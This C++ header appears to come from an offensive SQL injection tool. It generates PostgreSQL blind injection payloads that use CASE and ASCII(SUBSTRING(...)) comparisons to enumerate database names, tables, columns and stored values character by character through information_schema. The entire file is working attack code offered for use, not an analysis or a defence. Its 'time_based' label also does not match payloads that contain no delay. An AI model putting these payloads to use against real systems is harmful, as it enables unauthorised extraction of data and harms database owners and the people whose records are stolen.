#ifndef POSTGRESQL_TIME_BASED
#define POSTGRESQL_TIME_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct postgresql_time_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const int cmp = (*config[TIME_BASED_CMP])[0];
                switch (type)
                {
                case DATABASES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case TABLES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[TIME_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case COLUMNS:
                        return "' OR CASE WHEN ASCII(SUBSTRING(("
                               "SELECT column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[TIME_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[TIME_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                case VALUES:
                        return "' OR CASE WHEN ASCII(SUBSTRING(( SELECT " +
                               *config[TIME_BASED_COLUMN] + "::text " +
                               "FROM " + *config[TIME_BASED_DATABASE] + "." +
                               *config[TIME_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1))=" +
                               std::to_string(cmp) + " " +
                               "THEN 1 ELSE 0 END = 1-- ";
                default:
                        return std::string();
                }
        };
};
#endif
